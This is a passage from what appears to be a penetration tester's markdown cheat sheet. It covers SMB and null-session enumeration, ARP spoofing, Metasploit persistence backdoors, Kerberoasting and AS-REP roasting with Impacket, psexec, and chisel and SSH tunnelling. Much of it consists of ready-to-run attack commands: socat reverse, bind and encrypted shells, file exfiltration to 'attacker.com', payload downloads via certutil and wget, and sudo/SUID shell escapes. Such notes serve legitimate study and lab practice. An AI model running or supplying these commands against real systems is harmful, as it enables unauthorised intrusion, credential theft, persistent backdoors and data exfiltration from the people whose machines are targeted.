    smbclient -L //$RHOST/ -N                     :List shares, '' null login
    smbclient //$RHOST/$SHARE                     :
    smbclient //$RHOST/$SHARE -u 'administrator'  : Prompt to login as administrator
    smbclient //$RHOST/$SHARE -u 'guest' -p 'pass': Prompt to login as guest and password, if known

#DOWNLOAD
    get $FILE $SAVElocation

#LIST SHARES
-L       :List services
-N       :Null login, using '' both user:pass
-U $USER :supply username
-P $PASS :Supply password
$RHOST   :Target IP address

```

**EXAMPLE SMB PREVIEW:**

![](https://i.imgur.com/h3OUGqP.png)

**EXAMPLE FROM SHARES:**

> Sharename     | Type    | Comment
> ---            |---      |---
> eLS           | Disk    |
> ipc$          | IPC     | Remote IPC
> WIA_RIS_SHARE | Disk    |
> admin$        | Disk    | Remote Admin
> c$            | Disk    | Default share

> - works with both forms `//ip/shares` however backslashes require extra `\\\\ip\\shares`
> - *WIA_RIS_SHARE* is a directory on the share 
> - *eLS* is a directory on the share
> - Not only detects the same shares from other tools but also includes *hidden* shares such as `ipc$, admin$, c$`
> - **Can check if null session** attacks are possible by exploiting the `ipc$` share
> - Only able to target `ipc$` with smbclient to check nullsession exploit; won't work with other shares such as `c$`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Enum4Linux

Tags: [SMB-SAMBA-Shares](#SMB-SAMBA-Shares), [Shell-SMB](#Shell-SMB), [CrackMapExec](#CrackMapExec), [SMBclient](#SMBclient), [Windows-Shares](#Windows-Shares)

Another powerful tool that performs netBIOS and smb enquiries for info as well as allows bruteforcing and exploitation of null sessions as well.

**BY DEFAULT IT RUNS:**

> - User enumeration
> - Share enumeration
> - Group & member enumeration
> - Password policy extraction
> - OS information detection
> - *nmblookup* run
> - Printer information extraction

**ENUM4LINUX**

```powershell
#NMAP SCRIPTS
    nmap -script=smb-enum-shares $RHOST
    nmap -script=smb-enum-users $RHOST
    nmap -script=smb-brute $RHOST

#OPTIONS
    -n            :nmblookup
    -a            :'All' options
    -P            :'Password' policy
    -s $SHARElist :Bruteforce share name list from a word file
    -S            :Dump shares

#USAGE
    enum4linux $OPTION $RHOST
    enum4linux -a $RHOST
```

**ENUM4LINUX-NG**

```powershell
#USAGE
    /opt/enum4linux-ng.py -A -C $RHOST

#OPTIONS
    -A                 :Default, Do all simple enumeration including nmblookup (-U -G -S -P -O -N -I -L).
    -U                 Get users via RPC
    -G                 Get groups via RPC
    -Gm                Get groups with group members via RPC
    -S                 Get shares via RPC
    -C                 Get services via RPC
    -P                 Get password policy information via RPC
    -O                 Get OS information via RPC
    -L                 Get additional domain info via LDAP/LDAPS (for DCs only)
    -I                 Get printer information via RPC
    -R                 Enumerate users via RID cycling
    -N                 Do an NetBIOS names lookup (similar to nbtstat) and try to retrieve workgroup from output
    -w WORKGROUP       Specify workgroup/domain manually (usually found automatically)
    -u USER            Specify username to use (default "")
    -p PW              Specify password to use (default "")
    -d                 Get detailed information for users and groups, applies to -U, -G and -R
    -k USERS           User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none). Used to get sid with "lookupsid known_username"
    -r RANGES          RID ranges to enumerate (default: 500-550,1000-1050)
    -s SHARES_FILE     Brute force guessing for shares
    -t TIMEOUT         Sets connection timeout in seconds (default: 5s)
    -v                 Verbose, show full samba tools commands being run (net, rpcclient, etc.)
    --keep             Dont delete the Samba configuration file created during tool run after enumeration (useful with -v)
    -oJ OUT_JSON_FILE  Writes output to JSON file (extension is added automatically)
    -oY OUT_YAML_FILE  Writes output to YAML file (extension is added automatically)
    -oA OUT_FILE       Writes output to YAML and JSON file (extensions are added automatically)
```

**EXAMPLE FROM SHARES:**

> Name      | Tag    | Type       |Reg|Status
> ---       |---     |---         |---|---
> ELS-WINXP | `<00>` | `<UNIQUE>` | M | `<ACTIVE>`
> WORKGROUP | `<00>` | `<GROUP>`  | M | `<ACTIVE>`
> ELS-WINXP | `<20>` | `<UNIQUE>` | M | `<ACTIVE>`
> WORKGROUP | `<1e>` | `<GROUP>`  | M | `<ACTIVE>`
> `MAC address = 00-0C-29-BF-98-BD`

> - the `<20>` tag is interesting because it tells us that a filesharing services is running on the machine
> - the `<UNIQUE>` tag tells us tha this ocmputer must have only **one ip** address assigned
> - the `<WORKGROUP>` tag contains the workgroup or domain the computer **is joined to**

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------
## Nmblookup

Linux version of Nbtstat and enumerating shares. Requires the *Samba Suite* of tools installed. This comes pre-configured with kali linux and requires installation with other distros.

Produces the same content as windows - `nbtstat` which is just looking for *shares* and enumerating on them if available.

| Linux                                     | Desciption                                                                   |
| :---------------------------------------- | :--------------------------------------------------------------------------- |
| @ **Nmblookup Syntax**                    | ---                                                                          |
| `nmblookup <option> <ip.address>`         |
| `nmblookup --help`                        | displays help                                                                |
| @ **Examples**                            | ---                                                                          |
| `nmblookup -A 192.168.99.22`              | displays info about the target, workgroup names, computer names, MAC address |
| @ **Options**                             | ---                                                                          |
| `-A`                                      | lookup by IP address, checking node status                                   |
| ========================================= | =========================================                                    |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NBTSTAT-NET-VIEW

NbtStat is a windows commandline tool that can display information about a target and checking for *shares*.\
Net View is used to enumerate shares and get further information

**Used in windows cmd or powershell**

| Windows                                   | Desciption                                                                    |
| :---------------------------------------- | :---------------------------------------------------------------------------- |
| @ **NBTSTAT Syntax**                      | ---                                                                           |
| `nbtstat /?`                              | Help pages to see how to use nbtstat                                          |
| `nbtstat <option> <ip.address>`           |
| @ **Examples**                            | ---                                                                           |
| `nbtstat -A 192.168.99.22`                | displays info about the target, workgroup names, computer names, MAC address  |
| @ **Options**                             | ---                                                                           |
| `-A <ip.address>`                         | Remote machine's name table **given its IP address**                          |
| `-a`                                      | List remote machines name table **given its IP address**                      |
| `-c`                                      | Lists of *NBT* cache of remote (machine) names and their ip                   |
| `-n`                                      | Lists local NetBIOS names                                                     |
| ========================================= | =========================================                                     |
| @ **NET VIEW Syntax**                     | ---                                                                           |
| `net view <ip.address>`                   | Once discovered file server service running, enumerate shares with `net view` |
| @ **Examples**                            | ---                                                                           |
| `net view 192.168.99.22`                  | enumerate to find shares                                                      |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Null-Sessions

Null sessions allow an anonymous connection to a network share on windows based system. Allowing access to the the victim machine without any credentials at all.\
Only against IPC$ or Interprocess Communication - this allows other windows processes to communicate with other processes on the network

Exploits an authentication vulnerability for Windows Administrative Shares, letting an attacker connect to a local or remote share *without* authentication

**Null Session attacks work on **legacy** systems as most patched machines are immune now. If successful, attackers can steal:**

> - Passwords
> - System users
> - System groups
> - Running system processes

**Ports used for specific *Printer and File Sharing*:**

> - Port 135, 139, 445

**CHECKING FOR NULL SESSIONS:**

Null sessions are outdated and likely patched in most systems as they are not enabled on modern windows machines. However it is still possible to find in older enterprise networks.\
This is due to retro compatibility with legacy systemsn and applications.

**Once you have detected the *File and Printer Sharing* service is active **and** we have enumarated the *available shares* on the target by using:**

> - smbclient (linux)
> - nbmlookup (linux)
> - enum4linux (linux)
> - nbstat (windows)
> - net view (windows)
> - and so on...

Now we can check if a *null session attack* is possible. Below details we will try to exploit the `IPC$` administrative share by connecting to it without valid credentials.

| Windows  - Net Use                               | Desciption                                                                                                            |
| :----------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------- |
| @ **Syntax**                                     | ---                                                                                                                   |
| `net use \\<target.ip>\<target.share> <options>` | Checking for NULL Sessions                                                                                            |
| `net use \\<target.ip>\IPC$ '' /u:''`            | Attempt connection to `IPC$` share by using empty password and username; seeing if we can connect without credentials |
| @ **Examples**                                   | ---                                                                                                                   |
| `net use \\192.168.99.22\IPC$ '' /u: ''`         | Establishes connection to `IPC$` without specifying user. This example only works on `IPC$` and not `C$`              |
| @ **Options**                                    | ---                                                                                                                   |
| `\\<target.ip>\`                                 | Backslashes to select the target                                                                                      |
| `''`                                             | Empty string for password                                                                                             |
| `/u:''`                                          | Empty string for user                                                                                                 |

| Linux - smbclient                                  | Desciption                                                                                    |
| :------------------------------------------------- | :-------------------------------------------------------------------------------------------- |
| @ **Syntax**                                       | ---                                                                                           |
| `smbclient //<target.ip>/<target.share> <options>` | Checking for NULL Sessions                                                                    |
| @ **Examples**                                     | ---                                                                                           |
| `smbclient //192.168.99.22/IPC$ -N`                | As above, attempting to connect without providing credentials or providing empty credentials. |
| @ **Options**                                      | ---                                                                                           |
| `-N`                                               | Force tool to **not ask for password**                                                        |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Exploiting-NULL-Sessions

To exploit the shares once we know that the target is vulnerable to them

| Windows Tools                             | Desciption                                                                                                                                       |
| :---------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------- |
| @ **ENUM Exploiting**                     | ---                                                                                                                                              |
| `enum -S 192.168.99.22`                   | Enumarate **shares** on target ip using `-S` option                                                                                              |
| `enum -U 192.168.99.22`                   | Enumerate **users** for info such as number of user accounts                                                                                     |
| `enum -P 192.168.99.22`                   | Enumerate **password policy**, useful for network authentication attacks to know password policy such as lockout timing, min/max password length |
| ========================================= | =========================================                                                                                                        |
| @ **Winfo Exploiting**                    | ---                                                                                                                                              |
| `winfo 192.168.99.22 -n`                  | automate null session exploitation, `-n` option to focus null sessions                                                                           |


| Linux Tools                                                        | Desciption                                                                                                     |
| :----------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------- |
| @ **Enum4linux Exploiting**                                        | ---                                                                                                            |
| `enum4linux <options> <ip.address>`                                | variety tool to target a bunch of different details                                                            |
| @ **Examples**                                                     | ---                                                                                                            |
| `enum4linux -n 192.168.99.22`                                      | nmblookup for shares                                                                                           |
| `enum4linux -P 192.168.99.22`                                      | Enumerate **password policy**                                                                                  |
| `enum4linux -S 192.168.99.22`                                      | Enumerate **shares** available                                                                                 |
| `enum4linux -s /usr/share/enum4linux/share-list.txt 192.168.99.22` | Brute force **share name** guessing enumerations                                                               |
| @ **Options**                                                      | ---                                                                                                            |
| `-n`                                                               | nmblookup                                                                                                      |
| `-P`                                                               | Password policy                                                                                                |
| `-s`                                                               | Use bruteforce guess share name file                                                                           |
| `-a`                                                               | Complete full enumeration, all options                                                                         |
| =========================================                          | =========================================                                                                      |
| @ **nmap Exploiting**                                              | ---                                                                                                            |
| `nmap -script=smb-enum-shares 192.168.99.22`                       | shares script used to list share names and access indicating system is vulnerable to null sessions             |
| `nmap -script=smb-enum-users 192.168.99.22`                        | users script to list users to know all the users                                                               |
| `nmap -script=smb-brute 192.168.99.22`                             | Script to brute force users credentials, will try to bruteforce the remote user name and password of the users |

**Note for enum4linux, by default it performs:**
- > User enumeration
- > Share enumeration
- > Group & member enumeration
- > Password policy extraction
- > OS information detection
- > *nmblookup* run
- > Printer information extraction

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## ARP-Poisoning

Address-resolution-protocol

ARP is used to discover MAC addresses and then map them to an associated IP address.\
So with ARP poisoning, the idea is to 'poison' the host or targets **ARP cache** by tricking it into thinking its something that its not. By poisoning the ARP cache having the **attackers** MAC address embedded in the cache, for example pretending to be the default gateway; then when the victim sends data, he is actually sending it to the attacker.

The attack manipulates the ARP cache tables by sending **gratuitous ARP replies**:- Unsolicited ARP reply messages, sent without waiting for host to perform any request.\
As soon as the ARP table is manipulated, then **every packet** of communication will go to the attacker. The attacker then forwards them to the correct destination. This allows the attacker to then *sniff* the traffic between\
the poisoned hosts.

Attacker could also **change the content** of packets and manipulate the messages between parties.

ARP poisoning is form of man-in-the-middle attacks

**Example of a ARP cache**
> IP Address      | MAC Address         | Whoami
> ---             |---                  |---
> 10.0.2.255      | `ff-ff-ff-ff-f-ff`  | Broadcast
> 10.0.2.9        | `01-00-5e-00-00-fb` | user
> 10.0.2.15       | `08-00-27-0b-91-66` | webserver

With Arpspoofing, we are attempting to manipulate the table by placing the attackers mac address to pretend to be **both** the victim and the server so that we can be the middle man.

**Example of ARP poisoning**\

![](https://i.imgur.com/6fCvytU.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### MAC-Flooding-Spoofing

**MAC Flooding - Media Access Control**

MAC table is only so big. So attackers can send traffic with different source MAC addresses to the switch. The switch will continue to keep adding the MAC addresses to the table and eventually it will be filled up. When that capacity is hit, the switch will no longer be able to keep a log and update the table so instead it will start flooding traffic to **all interfaces**.\
This effectively **turns the switch into a hub**: all traffic is transmitted, no interruption in traffic flows

Attacker can then capture all traffic that is on the network. Capture packets and viewing anything as its being transmitted out.

Fortunately, most switches has guards in place to avoid this type of flooding.

**MAC Spoofing**

Attacker will clone or spoof their MAC address to match a legitimate device on the network. This will circumvent any filters in place for MAC addresses.

Could also create a DoS on the network. If the attacker is using the same MAC addresses as someone else on the network then the switch will continuously be updating the MAC table to match where the device is in the network. As it bounces between the real user and the fake user, it can create this denial-of-service situation for the switch.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## ARPspoof

*Dsniff* is a collection of tools for networking auditing and pentesting. It includes a ARPspoof utility designed to *intercept* traffic on a switched LAN.\
Redirects packets from hosts on LAN intended for another host on LAN, by forging ARP replies.

**IMPORTANT NOTE:** Before running the tool, enable *Linux Kernel IP Forwarding*, converts linux box into a router

> - `echo 1 > /proc/sys/net/ipv4/ip_forward`
> - **VERY important to run first** otherwise potentially DoSing the service or not being stealthy etc.

**EXAMPLE:**

> - `echo 1 > proc/sys/net/ipv4/ip_forward`
> - `arpspoof -i tap0 -t $RHOST -r $LHOST`
> - `wireshark` to intercept packets

|                                                              | Desciption                                                                  |
|:------------------------------------------------------------ |:--------------------------------------------------------------------------- |
| @ **ARPspoof Syntax**                                        | ---                                                                         |
| `arpspoof -i $INTERFACE -t $RHOST -r $LHOST`                 | **Interface**: eth0 or tap0 etc, **target** & **host**: victim ip addresses |
|                                                              |                                                                             |
| @ **Options**                                                | ---                                                                         |
| `-i tap0`                                                    | `-i` to select interface                                                    |
| `-t target`                                                  | Set the target such as **webserver** to spoof                               |
| `-r host`                                                    | Set host to spoof such as **user**                                          |
| =========================================                    | =========================================                                   |

**NOTE:**

> - **after running arpspoof** then you can run **wireshark** and intercept the traffic!
> - Using wireshark, you can filter by telnet, SMB etc to see what files or traffic is being transferred
> - Depending on **NMAP** data, you can see what services are being run and that will dictate what traffic to focus on.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Metasploit

Relational Tools:\
[[#Msfvenom]], [[#Windows-Privilege-Escalation]], [[#Common Shell Payloads]], [[#Webshells]], [[#WEB-ATTACKS]], [[#PAYLOADS-SHELLS]]

Metasploit is a tool with a wide array of community contributed exploits and attack vectors that can be used against various systems and technology.

**USEFUL COMMANDS:**

```powershell
#SCANS
use auxiliary/scanner/smb/smb_version		:SMB Version
use auxiliary/scanner/discovery/arp_sweep	:ARP Sweep
use auxiliary/scanner/portscan/tcp			:PORT scanning
use auxiliary/scanner/http/dir_scanner		:DIR Scanning
use auxiliary/scanner/http/jboss_vulnscan	:VULN Scan JBOSS
use auxiliary/scanner/mssql/mssql_login		:MSSQL Login
use auxiliary/scanner/mysql/mysql_version	:mySQL Version
use auxiliary/scanner/oracle/oracle_login	:Oracle

#EXPLOITS
use exploit/windows/local/persistence 		:Persistence/backdoor
use exploit/multi/script/web_delivery		:WEB Delivery
use exploit/windows/local/bypassuac 		:Bypass UAC
use exploit/multi/http/jboss_maindeployer	:JBOSS
use exploit/windows/mssql/mssql_payload		:MSSQL

#POST-EXPLOITS
use post/multi/recon/local_exploit_suggester 		:Privilege escalation suggester
use post/windows/manage/powershell/exec_powershell` :Upload powershell
use post/windows/gather/credentials/gpp 			:GPP Saved passwords
use post/windows/gather/local_admin_search_enum		:Other machines we have admin access to
use post/multi/manage/autoroute						:Autorouting
```

**COMMANDS:**

```powershell
#SEARCHING
search $SEARCH1 $SEARCH2 query all			:Multi search
search name: $NAME							:Filter name
search platform: $PLATFORM windows linux	:Filter platform
grep $FILTER search $SEARCH					:Grep for "keyword" when searching for modules
grep $FILTER show payloads					:Grep for "keyword" when showing Payloads
info $PAYLOAD								:Display info on module

#CORE
setg lhost $LHOST or setg lport $LPORT	:Global setting
exploit or run 							:Run module
sessions or sessions $ID				:List sessions or join session $ID
jobs									:List jobs
edit									:Edit current module in "VIM"
options									:List all options for current module
show payloads							:List all payloads for current module
set $OPTION $VALUE						:Configure option
set payload $PAYLOAD					:Select payload

#OTHER
load kiwi		:Select Mimikatz module
creds_all		:Mimikatz, dump hashes with Mimikatz
load powershell	:Select Powershell module
```

**PERSISTENCE (backdoor):**

```powershell
#SETUP
set reg_name backdoor
set exe_name backdoor
set startup SYSTEM (**note** capitals) #setting startup parameter to SYSTEM since we have system privileges
set session `<session.id>`
set payload windows/meterpreter/reverse_tcp
set lhost tap0
set lport 8080
set DisablePayloadHandler false

#REJOIN
Rejoin session manually; 
sessions -i `<session.id>`
shell
shutdown /r /f
You will notice the meterpreter connection will die due to reboot

#LISTENER
use exploit/multi/handler
set $LHOST $LPORT
set payload windows/meterpreter/reverse_tcp		:payload same as backdoor placed on victim
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Impacket

Tags: [Asrep-Roast](#Asrep-Roast), [Rubeus](#Rubeus), [Kerberos-Roast](#Kerberos-Roast) , [KERBEROS](#KERBEROS), [Active Directory](#Active%20Directory)

[Asrep-Roast](#Asrep-Roast)

Only requires __valid__ users, or valid credentials. This may return with a user that does not have __UF-DONT_REQUIRE_PREAUTH__ by default

```powershell
$DOMAIN				:i.e spookysec.local
$FULLDNSDOMAINNAME	:full qualified name i.e AttacktiveDirectory.spookysec.local
$USER				:user with pre-auth access i.e backup

impacket-GetNPUsers -format hashcat -dc-ip $RHOST -usersfile $FILEusers $DOMAIN/$NETBIOSNAME
impacket-secretsdump $FULLDNSDOMAINNAME/$USER@$RHOST
```


[Kerberos-Roast](#Kerberos-Roast)

Using impacket scripts that is run directly on the attacker host machine.  __Dump Kerberos Hash__ for all kerberoastable accounts it can find on the target domain.

```powershell
-dc-ip				:Domain controller ip
$FULL DOMAIN NAME	:Requires the fully qualified domain name
-request			:Request service ticket - Produce a hash, encrypted service ticket (TGS); cannot use ticket but can crack it.

sudo impacket-GetUserSPNs -dc-ip $RHOST "$FULL DOMAIN NAME/$USERNAME"
sudo impacket-GetUserSPNs -dc-ip $RHOST -request "$FULL DOMAIN NAME/$USERNAME"
sudo impacket-GetUserSPNs -dc-ip $RHOST -request $DOMAIN/$USER:$PASS` 				: calling directly the domain/user/password obtained
```

### PSExec

Using PSExec on SMB protocols to get execute commands such as a remote shell.

```powershell
$DOMAINname         :Domain name i.e 'gatekeeper'

impacket-psexec $DOMAINname/$USER:$PASS@$RHOST cmd.exe
```


------------------------------------------------------------------------------------------------------------------------------------------------------

## Port-Forwarding-Tunnelling

It can happen that sometimes systems will have an internal webservice that is listening on the loopback address `127.0.0.1` or `localhost` with the port only listening on that address.
This means that while the __attackers' host__ cannot connect and access that webservice `http://localhost:PORT`; the __target host__ can access that service.

So in order to get access to that port, we can __port forward__ to allow our __attackers' host__ to receive those resources on that internal web service.

**CHISEL:**

```powershell
#SETUP ON ATTACKER
    sudo python -m SimpleHTTPServer 80			:Setup server to transfer "chisel"
    ./chisel server -p 18110 -reverse		    :Running program as server

#TRANSFER
    mount | grep shm 														:Check for "noexec"
    which wget				                                                :[Linux], check if wget is available
    wget "http://$RHOST:$RPORT/chisel"										:Option 1: [victim] Download file from attacker server, place in %tmp% folder
    Certutil -urlcache -f http://$RHOST:$RPORT/chisel %tmp%/chisel.exe		:Option 2: [victim] Download file from attacker server, place in %tmp% folder

#TARGET
    $RHOST		:[Attacker] port
    $OPENPORT	:Port found through netstat on [Target]

    netstat -anlp tcp												:Determine listening tcp ports
    ss -nltp														:Alternative, [Target], Determine listening TCP ports
    ./chisel client $RHOST:18110 R:$OPENPORT:localhost:$OPENPORT	:Running program as client on

#SUCCESS
    http://localhost:$OPENPORT			:[Attacker], If successful then able to access the localhost on the port that was otherwise blocked off.

```

**SSH:**

```powershell
#TARGET
netstat -anlp tcp							:[Target], Determine listening TCP ports
ss -nltp									:Alternative, [Target], Determine listening TCP ports
~C											:[Target], Open up "SSH >" prompt
"SSH >" -L $OPENPORT:localhost:$OPENPORT	:[Target], In "SSH >" prompt, portforwarding the open port found through netstat

#SSH REVERSE TUNNELLING
-L    :(YOU <-- CLIENT) Specifies that the given port on the local (client) host is to be forwarded to the given host and port on the remote side
-R    :(YOU --> CLIENT)
ssh -L $PORT:localhost:$PORT $USER@$RHOST
ssh -R $PORT:localhost:$PORT $USER@$LHOST

#SUCCESS
http://localhost:$OPENPORT			:[Attacker], If successful then able to access the localhost on the port that was otherwise blocked off.
```

For example: ssh > `-L 8111:localhost:8111` is telling the computer to listen on 8111, all traffic received through port 8111 on my kali, I want to send through the tunnel to come out on 8111 on the target. 
ssh assumes the above as `localhost:8111:localhost:8111` but the above is just short hand.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SOCAT-Tool

Socat is similar to netcat in many ways but has a lot of functionality to allow it to do things slightly different. Works with both __linux__ and __windows__ however only the fully stabilised shell works with __linux__ only
The tool requires __two__ points to talk with each other so you will need to transfer the file to the target in order for it to open up communication leading to a __reverse/bind shell__
To accomplish stabilisation with `socat` then we will need to transfer the `socat static compiled binary` __to the target__ such as through a webserver.
%/
**SETUP:**

```powershell
$RHOST	:Remote IP

#LINUX
sudo python3 -m SimpleHTTPServer 80									:[Attacker]
wget $RHOST/socat -O /tmp/socat										:[Target]

#WINDOWS
sudo python3 -m SimpleHTTPServer 80									:[Attacker]
wget $RHOST/socat -O /tmp/socat										:[Target]
certutil -urlcache -f http://$RHOST/socat %tmp%/socat.exe			:[Target]
Invoke-WebRequest -uri $RHOST/socat.exe -outfile %tmp%/socat.exe

#SHELL CONFIG
#Always useful to adjust terminal size to fit more details in
stty -a 				:[Attacker], determine personal rows;column size
stty rows $ROWS			:[Target], Change target terminal to suit
stty cols $COLS			:[Target], Change target terminal to suit
```

**REVERSE SHELL:**

Note: The below listeners can be connected with any payload.

```powershell
bash -li	:Interactive bash
pty			:Stabilisation, allocates pseudo terminal
stderr		:Error messages output correctly, non-interactive has no error messages
sigint		:Allows Ctrl + C to kill commands inside shell without closure
setsid		:Creates process in new session
sane		:Normalise shell, further stability

#FULL REVERSE SHELL:
 
socat TCP-L:$LPORT FILE:`tty`,raw,echo=0								:[Attacker]
socat TCP:$RHOST:$RPORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane	:[Target]

#BASIC REVERSE SHELL:

socat TCP-L:$LPORT -								:[Attacker]
socat TCP:$RHOST:$RPORT EXEC:powershell.exe,pipes	:[Target]
socat TCP:$RHOST:$RPORT EXEC:"bash -li"				:[Target]

#BASIC BIND SHELL:

socat TCP:$RHOST:$RPORT -						:[Attacker]
socat TCP-L:$LHOST EXEC:powershell.exe,pipes	:[Target]
socat TCP-L:$LHOST EXEC:"bash -li"				:[Target]


```

**ENCRYPTED REVERSE SHELL:**

Encrypted shells cannot be spied on unless you have the decryption key, this means it often bypasses IDS as a result.

**Note:** 
- for a BIND shell which requires the __target__ device to listen means we need to also copy the `.pem` file over with the socat file.
- The certificate __must__ be used on whichever device is __listening__.

```powershell
verify=0		:Dont validate as cert signed by recognised authority
$SHELL.PEM		:Combined KEY and CRT = Generated cert as per requirements
$SHELL.KEY		:RSA key generated
$SHELL.CRT		:Sign a cert

#CERT GENERATION
openssl req --newkey rsa:2048 -nodes -keyout $SHELL.KEY -x509 -days 362 -out $SHELL.CRT		:Generate shell.key and shell.crt
Leave prompted details blank
cat $SHELL.KEY $SHELL.CRT > $SHELL.PEM														:Combine shell.key and shell.crt into $SHELL.PEM

#FULL REVERSE SHELL:
 
socat OPENSSL-LISTEN:$LPORT,cert=$SHELL.PEM,verify=0 FILE:`tty`,raw,echo=0		:[Attacker]
socat OPENSSL:$RHOST:$RPORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane		:[Target]

#BASIC REVERSE SHELL:

socat OPENSSL-LISTEN:$LPORT,cert={SHELL.PEM},verify=0 -							:[Attacker]
socat OPENSSL:$RHOST:$RPORT,verify=0 EXEC:/bin/bash								:[Target]

#BASIC BIND SHELL:

socat OPENSSL:$RHOST:$RPORT,verify=0 -											:[Attacker]
socat OPENSSL-LISTEN:$LPORT,cert={SHELL.PEM},verify=0 EXEC:cmd.exe,pipes		:[Target]

```

**OTHER FUNCTIONS**

```powershell
#FILE UPLOAD: 
#It can exfiltrate files on the network.    
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send

socat -u tcp-listen:$LPORT,reuseaddr open:file_to_save,creat 	:[Attacker]
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT					:[Target]


#FILE DOWNLOAD: 
#It can download remote files.
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
    
socat -u file:file_to_send tcp-listen:$LPORT,reuseaddr		:[Attacker]
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat		:[Target]

#FILE WRITE: 
#It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
LFILE=file_to_write
    
socat -u 'exec:echo DATA' "open:$LFILE,creat"	:[Target]

#FILE READ:
#It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
LFILE=file_to_read

socat -u "file:$LFILE" -		:[Target]

#SUDO:
#If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo socat stdin exec:/bin/sh 	:[Target]

#LIMITED SUID:
#If the binary has the SUID bit set, it may be abused to access the file system, If it is used to run commands (e.g., via `system()`-like invocations)
#This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
RHOST=attacker ip
RPORT=12345

socat file:`tty`,raw,echo=0 tcp-listen:$LPORT									:[Attacker]
sudo install -m =xs $(which socat) .											:[Target]
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane`	:[Target]

```




[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# SHELLS-FIND

------------------------------------------------------------------------------------------------------------------------------------------------------

## Spawn-Stabilise-Shell

Often when you initially obtain a reverse shell, the shell might be *unstable and non-interactive*. This normally means that while netcat is getting the return of info from the targets shell,\
unfortunately it is not interactive in that it cannot interact with ssh or mysql and so forth directly through that reverse shell.

This is due to the netcat "shells" aren't really terminals but rather *processes* that run inside a terminal. Programs  such as ssh and mysql require responses and passwords from the user; these are interactive. 

**PYTHON SHELL:**

Using python we can make the shell prettier but **still doesn't support** tab-completion or the arrow keys and Ctrl + C will still kill the shell.
Backgrounding this shell and using `ssty raw -echo; fg` will turn off our own terminal echo and then foregrounds the shell again. Now we have a pseudo interactive TTY and now we can interact with mysql or ssh and so forth

```powershell
#LINUX
    which python or python2 or python3			:[Target] Version/Program on target
    python -c 'import pty; pty.spawn("/bin/bash")' :Using python
    Ctrl + Z									:Background the simple shell
    stty raw -echo; fg							:set tty (raw), remove echo then foreground shell
    export TERM=xterm
```

**RLWRAP SHELL:**

rlwrap is a program that allows auto-completion, history, arrow keys and so forth **immediately upon receiving a shell**/
Sounds great right? Some manual stabilisation must be utilised if you want to be able to use `ctrl + c` inside the shell.

Note: With windows you won't be able to stabilise further like with linux

```powershell
#WINDOWS
    rlwrap nc -lvnp $LPORT			:[Attacker] run listener
    Run any reverse shell			:[Target] Execute reverse shell

#LINUX
    rlwrap nc -lvnp $LPORT			:[Attacker] run listener
    Run any reverse shell			:[Target] Execute reverse shell
    Ctrl + Z						:Background the simple shell
    stty raw -echo; fg				:set tty (raw), remove echo then foreground shell
```

[Back to Top](#table-of-contents)

## Shell-Meterpreter

A type of shell that is feature-rich when exploiting a remote host
 
 **LOAD POWERSHELL**
 
 ```powershell
load powershell			:Load module
powershell_execute		:Running commands from meterpreter
powershell_import		:Import file
powershell_shell		:Interactive shell without the auto complete, keyboard complete etc
 ```

**COMMANDS**

```powershell
#CORE
    Ctrl + Z		:Background running shell	
    search $QUERY	:Search modules 
    options			:Display options, Config with set $OPTION $VALUE
    sessions		:Display sessions, join with session $SESSION
    jobs			:Display jobs, Join with jobs $JOB

#NETWORK
    arp				:Display ARP
    ifconfig		:IP Addr, Ifconfig, Ipconfig
    route			:Display Route table
    portfwd			:Portforwarding localport to remote port

#SYSTEM
    pwd				:Current DIR
    hashdump		:Dump hashes
    getuid			:Display User name
    getenv			:Display environment variables
    use priv		:Load priv module
    getprivs		:Display current privs
    getsystem		:Priv escalation attempt
    getpid			:Display current process ID
    steal_token		:Token impersonation
    ps				:Dump process IDs
    ps -U $ROLE		:Target role, i.e SYSTEM process IDs
    migrate $PID	:Migrate stable process
    sysinfo			:Dump system info

#DOWNLOAD/UPLOAD
    download $FILEpath $SAVElocation	:Extract file to location
    upload $FILEpath $SAVElocation		:Upload file to location
    execute -f $FILEpath				:Run uploaded file

#SEARCH
    search			:Searching

```

[Back to Top](#table-of-contents)

## Shell-NETCAT

```powershell
#SYSTEM
    whoami							:Display User
    id								:Display User

#VERSION
    which python3					:Linux
    python							:Windows
    Get-Command Certutil			:Windows
    Get-Command Invoke-WebRequest	:Windows

#UPGRADE SHELL
    python -c 'import pty;pty.spawn("/bin/sh")'	:Linux
    python -c 'import pty;pty.spawn("cmd.exe")'	:Windows
    Ctrl + Z									:Background shell netcat listener
    ssty raw -echo; fg							:Set tty=raw, remove echo, foreground shell

```

[Back to Top](#table-of-contents)

## Shell-CMD

```powershell
#USER/GROUP
    $USER					:User name
    $GROUP					:Group name
    
